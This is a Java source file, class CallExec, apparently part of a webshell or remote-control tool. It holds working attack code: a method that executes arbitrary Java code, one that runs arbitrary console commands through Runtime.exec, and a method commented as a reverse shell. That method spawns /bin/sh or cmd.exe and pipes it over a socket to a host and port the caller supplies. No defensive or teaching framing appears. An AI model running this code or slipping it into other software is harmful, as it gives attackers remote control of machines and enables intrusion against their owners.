package exec.service;

import java.io.*;
import java.net.Socket;

/**
 * 代码执行、命令执行
 */
public class CallExec {
    public static void main(String[] args) {
        String s = "###:###fdsfds";
        String[] ss = s.split("###:###");
        System.out.println(ss[0]);
        System.out.println(ss[1]);
    }

    /**
     * 代码执行
     *
     * @param code
     * @return 输出信息（如打印信息）
     */
    public String eval(String code) {
        String[] ss = code.split("###:###");
        String fileName = ss[0];
        code = ss[1];

        Eval eval = new Eval();

        String result = "";
        if(fileName.indexOf(".java") != -1){
            result = eval.exeJava(code,fileName);
        }else if(fileName.indexOf(".class") != -1){
            result = eval.exeClass(code,fileName);
        }else if(fileName.indexOf(".py") != -1){

        }else if(fileName.indexOf(".") == -1){

        }



        return result;
    }

    /**
     * 控制台命令执行
     *
     * @param cmd
     * @return 执行结果
     */
    public String execmd(String cmd) {
        String result = "";
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            InputStreamReader ir = new InputStreamReader(p.getInputStream());
            LineNumberReader input = new LineNumberReader(ir);
            String line;
            while ((line = input.readLine()) != null) {
                result += line.concat("\r\n");
            }
            if (result.length() > 0) {
                result = result.substring(0, result.lastIndexOf("\r\n"));
            }
        } catch (Exception e) {
            result = "_error_:请输入正确命令";
        }

        return result;
    }

    /**
     * 反弹shell
     *
     * @param host
     * @param port
     */
    public String rShell(String host, int port) {
        String cmd = "/bin/sh";
        if (System.getProperty("os.name").toLowerCase().startsWith("win")) {
            //windows版本
            cmd = "cmd.exe";
        }

        Process p = null;
        Socket s = null;
        try {
            p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        p.destroy();
        try {
            s.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String res = "系统版本：".concat(System.getProperty("os.name")).concat("。反弹shell已退出。");
        return res;
    }

}
